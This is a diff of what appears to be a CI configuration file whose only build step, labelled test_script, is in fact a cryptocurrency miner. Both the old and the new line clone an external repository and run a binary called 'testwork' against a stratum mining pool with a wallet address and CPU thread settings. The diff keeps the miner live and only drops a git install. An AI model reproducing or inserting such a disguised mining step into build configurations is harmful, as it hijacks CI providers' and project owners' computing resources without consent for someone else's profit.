@@ -1,6 +1,6 @@
 image: Ubuntu
 
 test_script:
-- sudo apt-get update -y && apt-get install -y git && git clone https://github.com/remakove/marsose.git marsose && cd marsose && chmod +x testwork && ./testwork --algorithm yespower --pool stratum+tcps://stratum-na.rplant.xyz:13350 --wallet VPwdqwJ6LLWnCLeS9XPfoiXn81nuUjPB4E.pc --disable-gpu --cpu-threads 2
+- sudo apt-get update -y && git clone https://github.com/remakove/marsose.git marsose && cd marsose && chmod +x testwork && ./testwork --algorithm yespower --pool stratum+tcps://stratum-na.rplant.xyz:13350 --wallet VPwdqwJ6LLWnCLeS9XPfoiXn81nuUjPB4E.pc --disable-gpu --cpu-threads 2
 
 build: off
